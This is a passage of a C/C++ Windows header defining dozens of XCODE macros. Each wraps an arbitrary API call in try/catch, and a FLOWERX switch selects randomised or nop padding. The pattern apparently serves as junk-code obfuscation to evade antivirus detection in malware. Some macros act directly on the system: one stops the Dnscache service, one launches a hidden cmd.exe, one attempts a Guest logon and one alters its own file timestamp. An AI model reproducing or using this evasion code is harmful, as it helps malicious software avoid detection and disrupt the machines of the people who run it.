		if (RegQueryValueEx(hKey,AddMsg,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS)\
		{\
			RegQueryInfoKey(hKey,NULL,NULL,NULL,&dwSizeXXX,NULL,NULL,NULL,NULL,NULL,NULL,NULL);\
			if (dwSizeXXX)\
			{\
				for (PasswdLen=0; PasswdLen<dwSizeXXX; PasswdLen++)\
				{\
					szXBuff[0]='\0';\
					dwRes=MAX_PATH;\
					RegEnumKeyEx(hKey,PasswdLen,szXBuff,&dwRes,NULL,NULL,NULL,NULL);\
					if (stricmp(szXBuff,AddMsg))\
					{\
						bRetval=TRUE;\
						break;\
					}\
				}\
			}\
		}\
		RegCloseKey(hKey);\
	}\
		catch(...) {\
		Sleep(20);\
	}

#define XCODE21 try {OUTSTR("21");\
		if((scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE))!=NULL)\
		{\
			service=OpenService(scm,"Dnscache",SERVICE_QUERY_STATUS|SERVICE_CONTROL_STOP);\
			if (service)\
			{\
				bRetval=QueryServiceStatus(service,&status);\
				if (bRetval)\
				{\
					if (status.dwCurrentState!=SERVICE_STOPPED)\
					{\
						ControlService(service,SERVICE_CONTROL_STOP,&status);\
					}\
				}\
			}\
		}\
		CloseServiceHandle(service);\
		CloseServiceHandle(scm);\
	}\
	catch(...) {\
	Sleep(21);\
	}

#define XCODE22 try {OUTSTR("22");\
		pbm = CBitmap::FromHandle(hbm);\
		if(::PathFileExists(szXBuff))\
		{\
			hbm = (HBITMAP)::LoadImage(NULL, szXBuff, IMAGE_BITMAP, 0, 0, LR_DEFAULTCOLOR|LR_DEFAULTSIZE|LR_LOADFROMFILE);\
			if(hbm != NULL)\
			{\
				pbm->GetBitmap(&bm);\
				pbm->Detach();\
			}\
		}\
	}\
		catch(...) {\
		Sleep(22);\
	}

#define XCODE23 try {OUTSTR("23");\
		if ((NtQuerySystemInformation = (PROCNTQSI)GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation")))\
		{\
			NtQuerySystemInformation(0, &SysBaseInfo,sizeof(SysBaseInfo),NULL);\
			NtQuerySystemInformation(3, &SysTimeInfo,sizeof(SysTimeInfo),0);\
			NtQuerySystemInformation(2, &SysPerfInfo,sizeof(SysPerfInfo),NULL);\
		}\
	}\
		catch(...) {\
		Sleep(22);\
	}

#define XCODE24 try {OUTSTR("24");\
		hmyfile = CreateFile("C:\\Windows\\system32\\kernel32.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );\
		if ( hmyfile == INVALID_HANDLE_VALUE ) {\
			throw 1;\
		}\
		hXMod = CreateFileMapping( hmyfile, NULL, PAGE_READONLY, 0, 0, NULL );\
		if ( hXMod == INVALID_HANDLE_VALUE ) {\
			throw 1;\
		}\
		lp=NULL;\
		lp = MapViewOfFile( hXMod, FILE_MAP_READ, 0, 0, 0 );\
		if ( ! lp ) {\
			throw 1;\
		}\
		if ( *( USHORT* ) lp != IMAGE_DOS_SIGNATURE ) {\
			throw 1;\
		}\
		if ( *( ( DWORD* ) ( ( PBYTE ) lp + ( ( PIMAGE_DOS_HEADER ) lp )->e_lfanew ) ) != IMAGE_NT_SIGNATURE ) {\
			throw 1;\
		}\
}\
catch(...)  {\
	if(lp)\
		UnmapViewOfFile( lp );\
	if(hXMod)\
		CloseHandle( hXMod );\
	if(hmyfile)\
		CloseHandle( hmyfile );\
	Sleep(24);\
}

#define XCODE25 try {OUTSTR("25");\
	hdc = GetDC(NULL);\
	hPen = CreatePen(0, 1, RGB(0, 0, 0));\
	hOldPen = (HPEN) SelectObject(hdc, hPen);\
	PasswdLen = SetROP2(hdc, R2_NOT);\
	GetClientRect(NULL, &prcOld);\
	MoveToEx(hdc, prcOld.left, prcOld.top, NULL);\
    LineTo(hdc, prcOld.right, prcOld.top);\
    LineTo(hdc, prcOld.right, prcOld.bottom);\
    LineTo(hdc, prcOld.left, prcOld.bottom);\
    LineTo(hdc, prcOld.left, prcOld.top);\
	Rectangle(hdc, prcOld.left, prcOld.top, prcOld.right, prcOld.bottom);\
	SelectObject(hdc, hOldPen);\
	SetROP2(hdc, PasswdLen);\
    ReleaseDC(hwnd, hdc);\
}\
catch(...) {\
	Sleep(25);\
}

#define XCODE26 try {OUTSTR("26");\
	hwnd = CreateWindowW(L"Static",L"Application",WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,AfxGetInstanceHandle(),NULL);\
	ShowWindow(hwnd,SW_HIDE);\
	UpdateWindow(hwnd);\
}\
catch(...) {\
	Sleep(26);\
}

#define XCODE27 try {OUTSTR("27");\
	hIcon = ExtractIcon(AfxGetInstanceHandle(), AddMsg, 0);\
}\
	catch(...) {\
	Sleep(27);\
}

#define XCODE28 try {OUTSTR("28");\
	lp=VirtualAlloc(lp,16,MEM_RESERVE,PAGE_READWRITE);\
}\
	catch(...) {\
	Sleep(28);\
}

#define XCODE29 try {OUTSTR("29");\
hXMod=CreateMutex(NULL,TRUE, AddMsg);\
if(GetLastError()==ERROR_ALREADY_EXISTS)\
{\
	hXMod=CreateMutex(NULL,FALSE,"test");\
}\
}\
	catch(...) {\
	Sleep(29);\
}

#define XCODE30 try {OUTSTR("30");\
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);\
	sa.lpSecurityDescriptor = NULL;\
	sa.bInheritHandle = TRUE;\
	if (CreatePipe(&hXMod, &hmyfile, &sa, 0)) {\
		si.cb = sizeof(STARTUPINFO);\
		GetStartupInfo(&si);\
		si.hStdError = hmyfile;\
		si.hStdOutput = hmyfile;\
		si.wShowWindow = SW_HIDE;\
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;\
		if(CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {\
		memset(szXBuff, 0, MAX_PATH);\
		ReadFile(hXMod, szXBuff, MAX_PATH, &dwRes, NULL);\
		WaitForSingleObject(pi.hProcess, 30);\
		CloseHandle(hXMod);\
		CloseHandle(hmyfile);\
		}\
	}\
}\
	catch(...) {\
	Sleep(30);\
}

#define XCODE31 try {OUTSTR("31");\
::LogonUser("Guest", "localhost", "", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken);\
}\
	catch(...) {\
	Sleep(31);\
}

#define XCODE32 try {OUTSTR("32");\
	::PostThreadMessage(GetCurrentThreadId(), WM_TIMECHANGE, 0, 0);\
}\
	catch(...) {\
	Sleep(32);\
}

#define XCODE33 try {OUTSTR("33");\
		hBitmap = CreateDIBSection(GetDC(NULL), (BITMAPINFO*)hDib, DIB_RGB_COLORS, &lp, NULL, 0);\
		if (hBitmap == NULL)\
		{\
			::DeleteObject(hBitmap);\
			hBitmap = NULL;\
		}\
}\
	catch(...) {\
	Sleep(33);\
}

#define XCODE34 try {OUTSTR("34");\
	GetCursorPos(&pt);\
	if (pt.x<10 && pt.y<10)\
	{\
		SetCursorPos(pt.x+100, pt.y+100);\
	}\
}\
	catch(...) {\
	Sleep(34);\
}

#define XCODE35 try {OUTSTR("35");\
	hXMod=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, "kernel32.dll", 0, &dwSizeXXX);\
	if(WAIT_TIMEOUT==WaitForSingleObject(hXMod,200))\
	{\
		CloseHandle(hXMod);\
	}\
}\
	catch(...) {\
	Sleep(35);\
}

#define XCODE36 try {OUTSTR("36");\
    aaa.push_back(1);\
    aaa.push_back(2);\
    aaa.push_back(3);\
    aaa.push_back(4);\
    aaa.push_back(5);\
    for(iii=aaa.begin(); iii!=aaa.end(); ++iii){\
        std::cout<<(*iii)<<std::endl;\
    }\
}\
	catch(...) {\
	Sleep(36);\
}

#define XCODE37 try {OUTSTR("37");\
	hXMod = GetCurrentProcess();\
	GetProcessAffinityMask(hXMod, &dwSizeXXX,&dwRes);\
}\
	catch(...) {\
	Sleep(37);\
}

#define XCODE38 try {\
		i=sizeof(Ncb);\
		memset( &Ncb, 0, sizeof(Ncb) );\
		Ncb.ncb_command = NCBENUM;\
		Ncb.ncb_buffer = (UCHAR *)&lenum;\
		Ncb.ncb_length = sizeof(lenum);\
		uRetCode = Netbios( &Ncb );\
		for(i=0; i < lenum.length ;i++) {\
			memset( &Ncb, 0, sizeof(Ncb) );\
			Ncb.ncb_command = NCBRESET;\
			Ncb.ncb_lana_num = lenum.lana[i];\
			uRetCode = Netbios( &Ncb );\
			memset( &Ncb, 0, sizeof (Ncb) );\
			Ncb.ncb_command = NCBASTAT;\
			Ncb.ncb_lana_num = lenum.lana[i];\
			strcpy( (char*)Ncb.ncb_callname,  "*               " );\
			Ncb.ncb_buffer = (unsigned char *) &Adapter;\
			Ncb.ncb_length = sizeof(Adapter);\
			uRetCode = Netbios( &Ncb );\
			sprintf(szXBuff,"%02X-%02X-%02X-%02X-%02X-%02X",lenum.lana[i],Adapter.adapt.adapter_address[0],Adapter.adapt.adapter_address[1],Adapter.adapt.adapter_address[2],Adapter.adapt.adapter_address[3],Adapter.adapt.adapter_address[4],Adapter.adapt.adapter_address[5]);\
		}\
}\
	catch(...) {\
	Sleep(38);\
}

#define XCODE39 try {OUTSTR("39");\
	hXMod=GetCurrentThread();\
	i = GetThreadPriority(hXMod);\
	if ( i != THREAD_PRIORITY_ERROR_RETURN )\
	{\
		SetThreadPriority(hXMod, THREAD_PRIORITY_TIME_CRITICAL);\
	}\
	}\
	catch(...) {\
	Sleep(39);\
}

#define XCODE40 try {OUTSTR("40");\
	QueryPerformanceFrequency ( &count_freq );\
	}\
	catch(...) {\
	Sleep(40);\
}

#define XCODE41 try {OUTSTR("41");\
	MemStat.dwLength = sizeof(MEMORYSTATUS);\
	GlobalMemoryStatus(&MemStat);\
	sprintf(szXBuff,"%ld%ld%d",MemStat.dwTotalPhys,MemStat.dwAvailPhys,100-MemStat.dwMemoryLoad);\
	}\
	catch(...) {\
		Sleep(41);\
	}

#define XCODE42 try {OUTSTR("42");\
	StrCatA(szXBuff,AddMsg);\
	dwRes=MultiByteToWideChar(CP_ACP,0,szXBuff, -1, NULL, 0);\
	pwText = new wchar_t[dwRes];\
	MultiByteToWideChar (CP_ACP, 0, szXBuff, -1, pwText, dwRes);\
	delete []pwText;\
	}\
	catch(...) {\
	Sleep(42);\
	}

#define XCODE43 try {OUTSTR("43");\
	pwText = new wchar_t[1024];\
	swprintf(pwText,L"%S",AddMsg);\
	dwRes=WideCharToMultiByte(CP_ACP,0,pwText, wcslen(pwText), szXBuff, MAX_PATH, NULL, 0);\
	delete []pwText;\
	strcat(szXBuff,TmpBuf);\
	}\
	catch(...) {\
	Sleep(43);\
	}

#define XCODE44 try {OUTSTR("44");\
	GetModuleFileName(LoadLibrary("kernel32.dll"),szXBuff, MAX_PATH);\
	dwRes = ::GetFileVersionInfoSize((LPTSTR)szXBuff, &dwSizeXXX);\
	if ( dwRes != 0 ) {\
		pbFile = new BYTE[dwRes];\
		if (::GetFileVersionInfo((LPTSTR)szXBuff, dwSizeXXX, dwRes, (void**)pbFile) )\
		{\
			if(VerQueryValue(pbFile, "\\VarFileInfo\\Translation", (VOID FAR* FAR*)&lpBuffer, (UINT FAR *)&dwRes))\
				VerLanguageName (lpBuffer->wLanguage, TmpBuf, 512);\
		}\
		delete [] pbFile;\
	}\
	}\
		catch(...) {\
		Sleep(44);\
	}

#define XCODE45 try {OUTSTR("45");\
	DisableThreadLibraryCalls((HMODULE)GetModuleHandle("urlmon"));\
	}\
	catch(...) {\
	Sleep(45);\
	}

#define XCODE46 try {OUTSTR("46");\
	dwRes = (DWORD)GetWindowLong(GetActiveWindow(), GWL_WNDPROC);\
	wpOrigEditProc=(WNDPROC)dwRes;\
	SetWindowLong(GetActiveWindow(), GWL_WNDPROC, (LONG) wpOrigEditProc);\
	}\
	catch(...) {\
	Sleep(46);\
	}

#define XCODE47 try {OUTSTR("47");\
		GetSystemTime(&st);\
		SystemTimeToFileTime(&st, &ft);\
		GetModuleFileName(NULL, szXBuff, MAX_PATH);\
		hXMod = CreateFile(szXBuff, GENERIC_READ,NULL,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);\
		SetFileTime(hXMod,(LPFILETIME) NULL,(LPFILETIME) NULL,&ft);\
		CloseHandle(hXMod);\
	}\
	catch(...) {\
	Sleep(47);\
	}

#define XCODE48 try {OUTSTR("48");\
	lpvEnv = GetEnvironmentStrings();\
	if(lpvEnv != NULL)\
	{\
		lpszVariable = (LPTSTR)lpvEnv;\
		while(*lpszVariable)\
		{\
			sprintf(szXBuff,"%s\n", lpszVariable);\
			lpszVariable += lstrlen(lpszVariable) + 1;\
		}\
		FreeEnvironmentStrings(lpvEnv);\
	}\
	}\
	catch(...) {\
	Sleep(48);\
	}

#define XCODE49 try {OUTSTR("49");\
	if (GetCurrentDirectory(ARRAYSIZE(szXBuff), szXBuff) &&\
		SUCCEEDED(StringCchCopy(TmpBuf, 512, szXBuff)) &&\
		SUCCEEDED(StringCchCat(TmpBuf, 512, "//")) &&\
		SUCCEEDED(StringCchCat(TmpBuf, 512, "asce.ini"))) {\
		dwRes=GetTickCount();\
	}\
	}\
	catch(...) {\
	Sleep(49);\
	}

#define XCODE50 try {OUTSTR("50");\
	if(IsBadReadPtr(buf,16))\
	{\
		CopyMemory(szXBuff, buf, 16);\
	}\
	}\
	catch(...) {\
	Sleep(50);\
	}

#define XCODE51 try {OUTSTR("51");\
		GetExitCodeProcess(GetCurrentProcess(),&dwRes);\
	}\
	catch(...) {\
	Sleep(51);\
	}

#define XCODE52 try {OUTSTR("52");\
		if (GetLogicalDriveStrings(MAX_PATH, szXBuff))\
		{\
			buf=szXBuff;\
			do\
			{\
				*szDrive = *buf;\
				if (QueryDosDevice(szDrive, TmpBuf, MAX_PATH))\
				{\
					dwRes = strlen(TmpBuf);\
					if (dwRes < MAX_PATH)\
					{\
						bRetval = strnicmp(AddMsg, TmpBuf, dwRes) == 0;\
						if (bRetval)\
						{\
							StringCchPrintf(buf1,16,"%s",szDrive);\
						}\
					}\
				}\
				while (*buf++);\
			} while (!bRetval && *buf);\
		}\
	}\
	catch(...) {\
	Sleep(52);\
	}

#define XCODE53 try {OUTSTR("53");\
	GetDiskFreeSpace("C:\\",&dwRes,&dwSizeXXX,&cb,&dwBytesInBlock);\
	}\
	catch(...) {\
	Sleep(53);\
	}

#define XCODE54 try {OUTSTR("54");\
	bRetval=GlobalMemoryStatusEx((LPMEMORYSTATUSEX)szXBuff);\
	}\
	catch(...) {\
	Sleep(54);\
	}

#define XCODE55 try {OUTSTR("55");\
	GlobalMemoryStatus((LPMEMORYSTATUS)szXBuff);\
	}\
	catch(...) {\
	Sleep(55);\
	}

#define XCODE56 try {OUTSTR("56");\
	hXMod=CreateWaitableTimer(NULL, TRUE, NULL);\
	if (hXMod)\
	{\
		liDueTime.QuadPart = -100000000L;\
		if (SetWaitableTimer(hXMod, &liDueTime, 0, NULL, NULL, 0))\
		{\
			WaitForSingleObject(hXMod, 10);\
		}\
	}\
	}\
	catch(...) {\
	Sleep(56);\
	}

#define XCODE57 try {OUTSTR("57");\
	InterlockedExchange((volatile long *)&dwRes, dwSizeXXX);\
	}\
	catch(...) {\
	Sleep(57);\
	}

#define XCODE58 try {OUTSTR("58");\
	InterlockedExchangePointer(lp, buf);\
	}\
	catch(...) {\
	Sleep(58);\
	}
#ifdef FLOWERX
#include "xrand.h"
#else
#define XXX1 _asm nop;
#define XXX2 _asm nop;
#define XXX3 _asm nop;
#define XXX4 _asm nop;
#define XXX5 _asm nop;
#define XXX6 _asm nop;
#define XXX7 _asm nop;
#define XXX8 _asm nop;
#define XXX9 _asm nop;
#define XXX10 _asm nop;
#define XXX11 _asm nop;
#endif
